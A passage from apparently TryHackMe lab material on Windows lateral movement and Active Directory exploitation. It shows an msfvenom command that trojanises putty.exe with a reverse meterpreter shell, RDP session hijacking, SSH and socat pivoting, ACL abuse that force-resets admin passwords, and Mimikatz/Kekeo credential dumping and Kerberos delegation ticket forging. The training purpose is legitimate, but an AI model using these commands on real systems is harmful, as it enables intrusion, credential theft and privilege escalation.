msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> lport=4444 -b "\x00" -f exe -o puttyX.exe
```

The resulting puttyX.exe will execute a reverse_tcp meterpreter
 payload without the user noticing it. Once the file has been generated,
 we can replace the executable on the windows share and wait for any 
connections using the exploit/multi/handler module from Metasploit.

## RDP hijacking

When an administrator uses Remote Desktop to connect to a machine and closes the RDP
 client instead of logging off, his session will remain open on the 
server indefinitely. If you have SYSTEM privileges on Windows Server 
2016 and earlier, you can take over any existing RDP session without 
requiring a password.

If we have administrator-level access, we can get SYSTEM by any 
method of our preference. For now, we will be using psexec to do so. 
First, let's run a cmd.exe as administrator:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/7ba63227fb9d7244d5814b0e4fd57793.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/7ba63227fb9d7244d5814b0e4fd57793.png)

From there, run `PsExec64.exe`(available at `C:\tools\`):

```
PsExec64.exe -s cmd.exe
```

To list the existing sessions on a server, you can use the following command:

Command Prompt

```
C:\> query user
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>administrator         rdp-tcp#6           2  Active          .  4/1/2022 4:09 AM
 luke                                    3  Disc            .  4/6/2022 6:51 AM
```

According to the command output above, if we were currently connected via RDP using the administrator user, our SESSIONNAME would be `rdp-tcp#6`. We can also see that a user named luke has left a session open with id `3`. Any session with a **Disc**
 state has been left open by the user and isn't being used at the 
moment. While you can take over active sessions as well, the legitimate 
user will be forced out of his session when you do, which could be 
noticed by them.

To connect to a session, we will use tscon.exe and specify the 
session ID we will be taking over, as well as our current SESSIONNAME. 
Following the previous example, to takeover luke's session if we were 
connected as the administrator user, we'd use the following command:

```
tscon 3 /dest:rdp-tcp#6
```

In simple terms, the command states that the graphical session `3` owned by luke, should be connected with the RDP session `rdp-tcp#6`, owned by the administrator user.

As a result, we'll resume luke's RDP session and connect to it immediately.

**Note:** Windows Server 2019 won't allow you to connect to another user's session without knowing its password.

**Port Forwarding**

Most of the 
lateral movement techniques we have presented require specific ports to 
be available for an attacker. In real-world networks, the administrators
 may have blocked some of these ports for security reasons or have 
implemented segmentation around the network, preventing you from 
reaching SMB, RDP, WinRM or RPC ports.

To go around these restrictions, we can use port forwarding 
techniques, which consist of using any compromised host as a jump box to
 pivot to other hosts. It is expected that some machines will have more 
network permissions than others, as every role in a business will have 
different needs in terms of what network services are required for 
day-to-day work.

## SSH Tunnelling

The first protocol we'll be looking at is SSH, as it already has built-in functionality to do port forwarding through a feature called **SSH Tunneling**. While SSH
 used to be a protocol associated with Linux systems, Windows now ships 
with the OpenSSH client by default, so you can expect to find it in many
 systems nowadays, independent of their operating system.

SSH
 Tunnelling can be used in different ways to forward ports through an 
SSH connection, which we'll use depending on the situation. To explain 
each case, let's assume a scenario where we've gained control over the 
PC-1 machine (it doesn't need to be administrator access) and would like
 to use it as a pivot to access a port on another machine to which we 
can't directly connect. We will start a tunnel from the PC-1 machine, 
acting as an SSH client, to the Attacker's PC, which will act as an SSH 
server. The reason to do so is that you'll often find an SSH client on 
Windows machines, but no SSH server will be available most of the time.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9fb527b63773be22aa214ea2d06d1351.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9fb527b63773be22aa214ea2d06d1351.png)

Since we'll be making a connection back to our attacker's machine, 
we'll want to create a user in it without access to any console for 
tunnelling and set a password to use for creating the tunnels:

```
useradd tunneluser -m -d /home/tunneluser -s /bin/true
passwd tunneluser
```

Depending on your needs, the SSH tunnel can be used to do either local or remote port forwarding. Let's take a look at each case.

### SSH Remote Port Forwarding

In our example, let's assume that firewall policies block the 
attacker's machine from directly accessing port 3389 on the server. If 
the attacker has previously compromised PC-1 and, in turn, PC-1 has 
access to port 3389 of the server, it can be used to pivot to port 3389 
using remote port forwarding from PC-1. **Remote port forwarding** allows you to take a reachable port from the SSH client (in this case, PC-1) and project it into a **remote** SSH server (the attacker's machine).

As a result, a port will be opened in the attacker's machine 
that can be used to connect back to port 3389 in the server through the SSH tunnel. PC-1 will, in turn, proxy the connection so that the server will see all the traffic as if it was coming from PC-1:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/49401a0687c38a1ce78fdd5852aca5a7.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/49401a0687c38a1ce78fdd5852aca5a7.png)

A valid question that might pop up by this point is why we need port forwarding if we have compromised PC-1 and can run an RDP
 session directly from there. The answer is simple: in a situation where
 we only have console access to PC-1, we won't be able to use any RDP 
client as we don't have a GUI. By making the port available to your 
attacker's machine, you can use a Linux RDP client to connect. Similar 
situations arise when you want to run an exploit against a port that 
can't be reached directly, as your exploit may require a specific 
scripting language that may not always be available at machines you 
compromise along the way.

Referring to the previous image, to forward port 3389 on the server 
back to our attacker's machine, we can use the following command on 
PC-1:

PC1: Command Prompt

```
C:\> ssh tunneluser@1.1.1.1 -R 3389:3.3.3.3:3389 -N
```

This will establish an SSH session from PC-1 to `1.1.1.1` (Attacker PC) using the `tunneluser` user.

Since the `tunneluser` isn't allowed to run a shell on the Attacker PC, we need to run the `ssh` command with the `-N` switch to prevent the client from requesting one, or the connection will exit immediately. The `-R`
 switch is used to request a remote port forward, and the syntax 
requires us first to indicate the port we will be opening at the SSH
 server (3389), followed by a colon and then the IP and port of the 
socket we'll be forwarding (3.3.3.3:3389). Notice that the port numbers 
don't need to match, although they do in this example.

The command itself won't output anything, but the tunnel will depend 
on the command to be running. Whenever we want, we can close the tunnel 
by pressing CTRL+C as with any other command.

Once our tunnel is set and running, we can go to the attacker's machine and RDP into the forwarded port to reach the server:

Attacker's Machine

```
munra@attacker-pc$ xfreerdp /v:127.0.0.1 /u:MyUser /p:MyPassword
```

### SSH Local Port Forwarding

**Local port forwarding** allows us to "pull" a port from an SSH
 server into the SSH client. In our scenario, this could be used to take
 any service available in our attacker's machine and make it available 
through a port on PC-1. That way, any host that can't connect directly 
to the attacker's PC but can connect to PC-1 will now be able to reach 
the attacker's services through the pivot host.

Using this type of port forwarding would allow us to run reverse 
shells from hosts that normally wouldn't be able to connect back to us 
or simply make any service we want available to machines that have no 
direct connection to us.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/23c086c89a5bbe2fa364c95064235fb5.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/23c086c89a5bbe2fa364c95064235fb5.png)

To forward port 80 from the attacker's machine and make it available from PC-1, we can run the following command on PC-1:

PC1: Command Prompt

```
C:\> ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N
```

The command structure is similar to the one used in remote port forwarding but uses the `-L` option for local port forwarding. This option requires us to indicate the local socket used by PC-1 to receive connections (`*:80`) and the remote socket to connect to from the attacker's PC perspective (`127.0.0.1:80`).

Notice that we use the IP address 127.0.0.1 in the second socket, as 
from the attacker's PC perspective, that's the host that holds the port 
80 to be forwarded.

Since we are opening a new port on PC-1, we might need to add a firewall rule to allow for incoming connections (with `dir=in`). Administrative privileges are needed for this:

```
netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80
```

Once your tunnel is set up, any user pointing their browsers to PC-1 at `http://2.2.2.2:80` and see the website published by the attacker's machine.

## Port Forwarding With socat

In situations where SSH
 is not available, socat can be used to perform similar functionality. 
While not as flexible as SSH, socat allows you to forward ports in a 
much simpler way. One of the disadvantages of using socat is that we 
need to transfer it to the pivot host (PC-1 in our current example), 
making it more detectable than SSH, but it might be worth a try where no
 other option is available.

The basic syntax to perform port forwarding using socat is much 
simpler. If we wanted to open port 1234 on a host and forward any 
connection we receive there to port 4321 on host 1.1.1.1, you would have
 the following command:

```
socat TCP4-LISTEN:1234,fork TCP4:1.1.1.1:4321
```

The `fork` option allows socat to fork a 
new process for each connection received, making it possible to handle 
multiple connections without closing. If you don't include it, socat 
will close when the first connection made is finished.

Coming back to our example, if we wanted to access port 3389 on the server using PC-1 as a pivot as we did with SSH remote port forwarding, we could use the following command:

PC-1: Command Prompt

```
C:\>socat TCP4-LISTEN:3389,fork TCP4:3.3.3.3:3389
```

Note that socat can't forward the connection directly to the attacker's machine as SSH did but will open a port on PC-1 that the attacker's machine can then connect to:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d7128a0e5d344785ed570c2b8b90c775.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d7128a0e5d344785ed570c2b8b90c775.png)

As usual, since a port is being opened on the pivot host, we might 
need to create a firewall rule to allow any connections to that port:

```
netsh advfirewall firewall add rule name="Open Port 3389" dir=in action=allow protocol=TCP localport=3389
```

If, on the other hand, we'd like to expose port 80 from the 
attacker's machine so that it is reachable by the server, we only need 
to adjust the command a bit:

PC-1: Command Prompt

```
C:\>socat TCP4-LISTEN:80,fork TCP4:1.1.1.1:80
```

As a result, PC-1 will spawn port 80 and listen for connections to be forwarded to port 80 on the attacker's machine:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/4874c8eb2e92a55b93c3dbbc2409e54b.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/4874c8eb2e92a55b93c3dbbc2409e54b.png)

### Dynamic Port Forwarding and SOCKS

While single port forwarding works quite well for tasks that require 
access to specific sockets, there are times when we might need to run 
scans against many ports of a host, or even many ports across many 
machines, all through a pivot host. In those cases, **dynamic port forwarding** allows us to pivot through a host and establish several connections to any IP addresses/ports we want by using a **SOCKS proxy**.

Since we don't want to rely on an SSH
 server existing on the Windows machines in our target network, we will 
normally use the SSH client to establish a reverse dynamic port 
forwarding with the following command:

PC1: Command Prompt

```
C:\> ssh tunneluser@1.1.1.1 -R 9050 -N
```

In this case, the SSH server will start a SOCKS proxy on port `9050`, and forward any connection request through the SSH tunnel, where they are finally proxied by the SSH client.

The most interesting part is that we can easily use any of our tools through the SOCKS proxy by using **proxychains**.
 To do so, we first need to make sure that proxychains is correctly 
configured to point any connection to the same port used by SSH for the SOCKS proxy server. The proxychains configuration file can be found at `/etc/proxychains.conf`
 on your AttackBox. If we scroll down to the end of the configuration 
file, we should see a line that indicates the port in use for socks 
proxying:

```
[ProxyList]
socks4  127.0.0.1 9050
```

The default port is 9050, but any port will work as long as it matches the one we used when establishing the SSH tunnel.

If we now want to execute any command through the proxy, we can use proxychains:

```
proxychains curl http://pxeboot.za.tryhackme.com
```

Note that some software like nmap might not work well with SOCKS in 
some circumstances, and might show altered results, so your mileage 
might vary.

**EXPLOITING  AD**

**Exploiting Permission Delegation**

Active
 Directory can delegate permissions and privileges through a feature 
called Permission Delegation (not to be confused with Kerberos
 Delegation that will be discussed in the next task). Delegation is what
 makes AD so powerful in organisations. Imagine we work for an 
organisation that has 50000 employees. Since we care about security, we 
only have three users that have access to DA credentials. It would be 
impossible for those three users to field all requests from the users, 
such as resetting their passwords. Using Delegation, we can delegate the
 permission to force change a user's password to the Helpdesk team, 
meaning they now have a delegated privilege for this specific function. 
In principle, to keep Delegation secure, the principle of least 
privilege should be followed. However, in large organisations, this is 
easier said than done. In this task we will look at exploiting some 
Delegation misconfigurations.

# Permission Delegation

Permission Delegation exploits are often referred to as ACL-based attacks. AD
 allows administrators to configure Access Control Entries (ACEs) that 
populates Discretionary Access Control Lists (DACLs), hence the name 
ACL-based attacks. Almost any AD object can be secured with ACEs, which 
then describe the allowed and denied permissions that any other AD 
object has against the target object.

However, if these 
ACEs are misconfigured, it may be possible for an attacker to exploit 
them. Let's look at our example again. If the IT Support team were 
granted the ForceChangePassword ACE over the Domain Users group, this 
would be considered insecure. Sure they would be able to reset the 
passwords of employees that forgot their passwords, but this 
misconfiguration would allow them to also reset the passwords of 
privileged accounts, such as the accounts that are members of the Domain
 Admins group essentially allowing for privilege escalation.

# Exploiting ACEs

A significant amount of ACEs can be misconfigured, and the exploits for each vary. The [Bloodhound documentation](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#) assists in explaining enumerated ACEs and how they can be exploited. However, we will look at a couple of notable ones here:

- **ForceChangePassword:** We have the ability to set the user's current password without knowing their current password.
- **AddMembers:** We have the ability to add users (including our own account), groups or computers to the target group.
- **GenericAll:** We have complete control over the object, including the ability to change the user's password, register an SPN or add an AD object to the target group.
- **GenericWrite:** We can update any non-protected parameters of our target object. This
could allow us to, for example, update the scriptPath parameter, which
would cause a script to execute the next time the user logs on.
- **WriteOwner:** We have the ability to update the owner of the target object. We could
make ourselves the owner, allowing us to gain additional permissions
over the object.
- **WriteDACL:** We have the ability to write new ACEs to the target object's DACL. We could, for example, write an ACE that grants our account full control over the target object.
- **AllExtendedRights:** We have the ability to perform any action associated with extended AD rights against the target object. This includes, for example, the ability to force change a user's password.

In order to exploit these ACEs, we will need a method to interact with AD to make these requests. The two best options for this are the [AD-RSAT](https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps) PowerShell cmdlets or [PowerSploit](https://github.com/PowerShellMafia/PowerSploit).
 Depending on the breach and the detection tools in the environment, one
 option may be stealthier. In this task we will show both.

# Bloodhound

Sharphound
 has already been executed for you and attached as a task file. Start 
Bloodhound on the AttackBox or your Kali machine and ingest the data. 
You are, however, welcome to rerun Sharphound yourself using the steps 
provided in the [Enumerating AD room](https://tryhackme.com/room/adenumeration). Note: if you get `Unable to connect to LDAP, verify your credentials`
 make sure you have the domain set correctly. We provided a ZIP of 
SharpHound data as a taskfile. On the AttackBox, you can find the ZIP 
file under `/root/Rooms/ExploitingAD/`.  First, we will need to start neo4j:

Command Prompt

```
thm@thm:~# neo4j console startActive database: graph.db
Directories in use:
  home:         /var/lib/neo4j
  config:       /etc/neo4j
  logs:         /var/log/neo4j
  plugins:      /var/lib/neo4j/plugins
  import:       /var/lib/neo4j/import
  data:         /var/lib/neo4j/data
  certificates: /var/lib/neo4j/certificates
  run:          /var/run/neo4j
Starting Neo4j.
[....]
2022-03-13 19:59:18.014+0000 INFO  Bolt enabled on 127.0.0.1:7687.
```

In another Terminal tab, run `bloodhound --no-sandbox`. This will show you the authentication GUI:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/39f261aecedccbaf118eb2ee69d55129.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/39f261aecedccbaf118eb2ee69d55129.png)

The default credentials for the neo4j database will be

```
neo4j:neo4j
```

.
 Use this to authenticate in Bloodhound. Once authenticated, you can 
drag and drop the two zips on the Bloodhound screen. Once the data is 
ingested, we can start enumerating attack paths again.

# Privilege Escalation

If
 we search for our user account that was assigned in Task 1 in 
Bloodhound, we see that we don't have a lot of permissions. We have the 
ability to RDP into THMWRK1, but this will only provide us with low-privileged access.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/74eb0bd1b47163a36f225c01830c839f.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/74eb0bd1b47163a36f225c01830c839f.png)

Since the domain is tiered, our first step will be to compromise Tier 2 infrastructure. We need to compromise the *Tier 2 Admins*
 group since this group has administrative privileges on all 
workstations. Let's ask Bloodhound if there is perhaps a road that we 
can follow to compromise this group. Add your user account as the start 
position and the *Tier 2 Admins* group as the end position.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/b75142b902297d318ca720f67015788f.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/b75142b902297d318ca720f67015788f.png)

Bloodhound
 shows us a very interesting path. It seems that there was a slight bit 
of Permission Delegation in this domain. An administrator has 
misconfigured the Permission Delegation of the *IT Support* group by providing the *Domain Users* group with the AddMembers ACE. This means that any member of the *Domain Users* group (including our account) can add accounts to the *IT Support* Group. Furthermore, Bloodhound shows that the *IT Support* Group has the ForceChangePassword ACE for the *Tier 2 Admins*
 group members. This is not really a misconfiguration since Tier 2 
admins are not that sensitive, but it provides a very potent attack path
 when combined with the initial misconfiguration. Let's exploit it!

# AddMember

The first step in this attack path is to add our AD account to the *IT Support* group. We will use the **Add-ADGroupMember** PowerShell
 cmdlet from the AD-RSAT toolset for this. Start PowerShell (either in 
RDP or via SSH) on the THMJMP1 host and run the following command to add
 your account:

PowerShell

```
PS C:\>Add-ADGroupMember "IT Support" -Members "Your.AD.Account.Username"
```

We can verify that the command worked by using the **Get-ADGroupMember** cmdlet:

PowerShell

```
PS C:\>Get-ADGroupMember -Identity "IT Support"
distinguishedName : CN=hugh.jones,OU=Consulting,OU=People,DC=za,DC=tryhackme,DC=loc
name              : hugh.jones
objectClass       : user
objectGUID        : 460178d3-c818-4e28-9a39-b1ab2b0d3779
SamAccountName    : hugh.jones
SID               : S-1-5-21-3885271727-2693558621-2658995185-1113

```

If everything worked, you should see your account as a member.

# ForceChangePassword

Now that we are a member of the *IT Support* group, we have inherited the ForceChangePassword Permission Delegation over the *Tier 2 Admins* group. First, we need to identify the members of this group to select a target. We can use the **Get-ADGroupMember** cmdlet again to assist with this:

PowerShell

```
PS C:\>Get-ADGroupMember -Identity "Tier 2 Admins"
distinguishedName : CN=t2_lawrence.lewis,OU=T2 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc
name              : t2_lawrence.lewis
objectClass       : user
objectGUID        : 4ca61b47-93c8-44d2-987d-eca30c69d828
SamAccountName    : t2_lawrence.lewis
SID               : S-1-5-21-3885271727-2693558621-2658995185-1893

[....]

distinguishedName : CN=t2_leon.francis,OU=T2 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc
name              : t2_leon.francis
objectClass       : user
objectGUID        : 854b6d40-d537-4986-b586-c40950e0d5f9
SamAccountName    : t2_leon.francis
SID               : S-1-5-21-3885271727-2693558621-2658995185-3660
```

Make a note of the username of one of these accounts. **Since the network is shared, it might be best to select one further down in the list.** We will use the **Set-ADAccountPassword** AD-RSAT cmdlet to force change the password:

PowerShell

```
PS C:\>$Password = ConvertTo-SecureString "New.Password.For.User" -AsPlainText -Force
PS C:\>Set-ADAccountPassword -Identity "AD.Account.Username.Of.Target" -Reset -NewPassword $Password
```

**Note:
 If you get an Access Denied error, your permissions have not yet 
propagated through the domain. This can take up to 10 minutes. The best 
approach is to terminate your SSH or RDP session, take a quick break, and then reauthenticate and try again. You could also run**

```
gpupdate /force
```

**and then disconnect and reconnect, which in certain cases will cause the synchronisation to happen faster.**

If
 this step worked, you should now be able to authenticate to THMWRK1 
using this target account with its new password. You currently have 
administrative access to this workstation. Congratulations! You have 
officially escalated your privileged to Tier 2 Administrator by 
exploiting Permission Delegations.

**Exploiting Kerberos Delegation**

Next, we will take a look at Kerberos Delegation. When you talk about AD Delegation, this is usually what is being discussed, not Permission Delegation.

# Kerberos

The practical use of Kerberos
 Delegation is to enable an application to access resources hosted on a 
different server. An example of this would be a web server that needs to
 access a SQL database hosted on the database server for the web 
application that it is hosting. Without delegation, we would probably 
use an AD service account and provide it with direct access to the 
database. When requests are made on the web application, the service 
account would be used to authenticate to the database and recover 
information.

However, we can allow this service account to be delegated to the SQL
 server service. Once a user logs into our web application, the service 
account will request access to the database on behalf of that user. This
 means that the user would only be able to access data in the database 
that they have the relevant permissions for without having to provide 
any database privileges or permissions to the service account itself.

# Constrained vs Unconstrained

There are two types of Kerberos
 Delegation. In the original implementation of Kerberos Delegation, 
Unconstrained Delegation was used, which is the least secure method.  In
 essence, Unconstrained Delegation provides no limits to the delegation.
 In the background, if a user with the "TRUSTED_FOR_DELEGATION" flag set
 authenticates to a host with Unconstrained Delegation configured, a 
ticket-granting ticket (TGT) for that user account is generated and 
stored in memory so it can be used later if needed. Suppose an attacker 
can compromise a host that has Unconstrained Delegation enabled. In that
 case, they could attempt to force a privileged account to authenticate 
to the host, which would allow them to intercept the generated TGT and 
impersonate the privileged service. If you want to see an example of the
 exploitation of Unconstrained Delegation, have a look [here](https://medium.com/@riccardo.ancarani94/exploiting-unconstrained-delegation-a81eabbd6976).

To
 combat the security failings of Unconstrained Delegation, Microsoft 
introduced Constrained Delegation in 2003. Constrained Delegation 
restricts what services an account can be delegated to, limiting 
exposure if an account is compromised. The following are examples of 
services that can be configured for delegation:

- HTTP - Used for web applications to allow pass-through authentication using AD credentials.
- CIFS - Common Internet File System is used for file sharing that allows delegation of users to shares.
- LDAP - Used to delegate to the LDAP service for actions such as resetting a user's password.
- HOST - Allows delegation of account for all activities on the host.
- MSSQL - Allows delegation of user accounts to the SQL service for pass-through authentication to databases.

Exploiting
 Constrained Delegation is usually more complex than exploiting 
Unconstrained Delegation since the delegated account can't just be used 
for everything. However, it can still be used for some powerful 
exploitation. An example of this would be if we were able to compromise 
an AD
 account that had constrained delegation configured. By knowing the 
plaintext password or even just the NTLM hash of this account, we could 
generate a TGT for this account, then use the TGT to execute a 
ticket-granting server (TGS) request for any non-sensitive user account 
in order to access the service as that user. Imagine impersonating an 
account with access to a sensitive database, for example.

# Resource-Based Constrained Delegation

So there are actually three types of Kerberos
 Delegation. But this one deserves to be mentioned on its own. 
Introduced by Microsoft in 2012, Resource-Based Constrained Delegation 
(RBCD) once again provided additional restrictions on Kerberos 
Delegation for security. RBCD changes the delegation model entirely. 
Instead of specifying which object can delegate to which service, the 
service now specifies which objects can delegate to it. This allows the 
service owner to control who can access it. In our web application 
example, this means that instead of specifying that the web service 
account can delegate to the database service to access the database, we 
can now specify that on the database service that the web service 
account is allowed to delegate access to it.

Let's say 
that we have permission to configure RBCD for a service. This means we 
have the ability to set the msDS-AllowedToActOnBehalfOfOtherIdentity 
attribute for the

AD

Object. We can populate this attribute with the details of an AD 
account that we have access to. To now gain access to the service, we 
can generate a TGT for the account we control, which will allow us to 
interact with this service. If you want a detailed example of RBCD 
exploitation, take a look

[here](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)

.

# Constrained Delegation Exploitation

We
 will exploit Constrained Delegation for this task. The first thing we 
need to do is enumerate available delegations. Let's use our new 
privileged user for the network couple of commands. We can use the **Get-NetUser** cmdlet of PowerSploit for this enumeration by running the following command:

PowerShell

```
PS C:\>Import-Module C:\Tools\PowerView.ps1
PS C:\>Get-NetUser -TrustedToAuth
```

Based on the output of this command, we can see that the svcIIS account can delegate the HTTP
 and WSMAN services on THMSERVER1. You would think that this means we 
can only access websites on behalf of impersonated users. However, 
PowerShell Remoting uses the HTTP and WSMAN services as well. The ideal 
option would be to impersonate a Tier 1 Admin since this would provide 
us with administrative access over THMSERVER1.

If you were 
to perform proper post-exploitation enumeration of THMWRK1, you would 
find that there is a service on the host running as the svcIIS user. 
Since we have administrative access now, we can use this to dump 
LSASecrets, part of the Windows Registry Hive where credentials are 
stored for features such as Windows services. Let's use [Mimikatz](https://github.com/gentilkiwi/mimikatz/security) to dump the secrets:

Command Prompt

```
C:\> C:\Tools\mimikatz_trunk\x64\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \ / ##       > https://blog.gentilkiwi.com/mimikatz '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

mimikatz # lsadump::secrets
Domain : THMWRK1
SysKey : redacted

Local name : THMWRK1 ( S-1-5-21-3226461851-763325627-4205969673 )
Domain name : ZA ( S-1-5-21-3885271727-2693558621-2658995185 )
Domain FQDN : za.tryhackme.loc

Policy subsystem is : 1.18
LSA Key(s) : 1, default {cfcff4be-beab-7d93-cfa3-edb6a9a3bf27}
  [00] {cfcff4be-beab-7d93-cfa3-edb6a9a3bf27} 929bd1cdc726d31f5eea6fa5266a09521afd0be6309a08fd604c9a95c2af4463

Secret  : $MACHINE.ACC
cur/text: redacted
    NTLM:redacted
    SHA1:redacted
old/text: redacted
    NTLM:redacted
    SHA1:redacted

Secret  : DefaultPassword
cur/text: redacted
old/text: redacted

Secret  : _SC_thmwinauth / service 'thmwinauth' with username : svcIIS@za.tryhackme.loc
cur/text: redacted

mimikatz #

```

Let's run through the two commands:

- token::elevate - To dump the secrets from the registry hive, we need to impersonate the SYSTEM user.
- lsadump::secrets - Mimikatz interacts with the registry hive to pull the clear text credentials.

Now that we have access to the password associated with the svcIIS account, we can perform a Kerberos delegation attack. We will use a combination of [Kekeo](https://github.com/gentilkiwi/kekeo) and [Mimikatz](https://github.com/gentilkiwi/mimikatz/security). You can use another window for Mimikatz, but make sure to exit out of Mimikatz after the `token::elevate`
 command, otherwise the tickets will be loaded in the wrong context 
later on. We will use Kekeo to generate our tickets and then use 
Mimikatz to load those tickets into memory. Let's start by generating 
the tickets:

Command Prompt

```
PS C:\> C:\Tools\kekeo\x64\kekeo.exe

  ___ _    kekeo 2.1 (x64) built on Dec 14 2021 11:51:55
 /   ('>-  "A La Vie, A L'Amour"
 | K  |    /* * *
 \____/     Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
  L\_       https://blog.gentilkiwi.com/kekeo                (oe.eo)
                                             with 10 modules * * */

kekeo #

```

We first need to generate a TGT that can be used to generate tickets for the HTTP and WSMAN services:

Kekeo

```
kekeo # tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:redactedRealm        : za.tryhackme.loc (za)
User         : svcIIS (svcIIS)
CName        : svcIIS   [KRB_NT_PRINCIPAL (1)]
SName        : krbtgt/za.tryhackme.loc  [KRB_NT_SRV_INST (2)]
Need PAC     : Yes
Auth mode    : ENCRYPTION KEY 23 (rc4_hmac_nt      ): 43460d636f269c709b20049cee36ae7a
[kdc] name: THMDC.za.tryhackme.loc (auto)
[kdc] addr: 172.31.1.101 (auto)
  > Ticket in file 'TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi'

```

Parameters explained:

- user - The user who has the constrained delegation permissions.
- domain - The domain that we are attacking since Kekeo can be used to forge tickets to abuse cross-forest trust.
- password - The password associated with the svcIIS account.

Now that we have the TGT
 for the account that can perform delegation, we can forge TGS requests 
for the account we want to impersonate. We need to perform this for both
 HTTP and WSMAN to allow us to create a PSSession on THMSERVER1:

Kekeo

```
kekeo # tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.locTicket  : TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
  [krb-cred]     S: krbtgt/za.tryhackme.loc @ ZA.TRYHACKME.LOC
  [krb-cred]     E: [00000012] aes256_hmac
  [enc-krb-cred] P: svcIIS @ ZA.TRYHACKME.LOC
  [enc-krb-cred] S: krbtgt/za.tryhackme.loc @ ZA.TRYHACKME.LOC
  [enc-krb-cred] T: [4/30/2022 1:29:00 PM ; 4/30/2022 11:29:00 PM] {R:5/7/2022 1:29:00 PM}
  [enc-krb-cred] F: [40e10000] name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
  [enc-krb-cred] K: ENCRYPTION KEY 18 (aes256_hmac      ): 548e500d4ee2f5c61710254ea9dd43e2ce0123026d329c97e512695e2f1777a7
  [s4u2self] t1_trevor.jones
[kdc] name: THMDC.za.tryhackme.loc (auto)
[kdc] addr: 172.31.1.101 (auto)
  > Ticket in file 'TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_svcIIS@ZA.TRYHACKME.LOC.kirbi'
Service(s):
  [s4u2proxy] http/THMSERVER1.za.tryhackme.loc
  > Ticket in file 'TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi'

```

Parameters explained:

- tgt - We provide the TGT that we generated in the previous step.
- user - The user we want to impersonate. Since t2_ accounts have
administrative access over workstations, it is a safe assumption that
t1_ accounts will have administrative access over servers, so choose a
t1_ account that you would like to impersonate.
- service - The services we want to impersonate using delegation. We first generate a TGS for the HTTP service. Then we can rerun the same command for the WSMAN service.

Run
 the command again, this time for the WSMAN service. Now that we have 
the two TGS tickets, we can use Mimikatz to import them:

Mimikatz

```
mimikatz # privilege::debugPrivilege '20' OK

mimikatz # kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi* File: 'TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi': OK

mimikatz # kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi* File: 'TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi': OK

```

You can exit Mimikatz and run `klist`
 if you want to verify that the tickets were imported. Now that the 
tickets are imported, we can finally create our PSSession on THMSERVER1:

PowerShell

         `mimikatz # exitBye!
PS C:> New-PSSession -ComputerName thmserver1.za.tryhackme.loc

 Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability
 -- ----            ------------    ------------    -----         -----------------     ------------
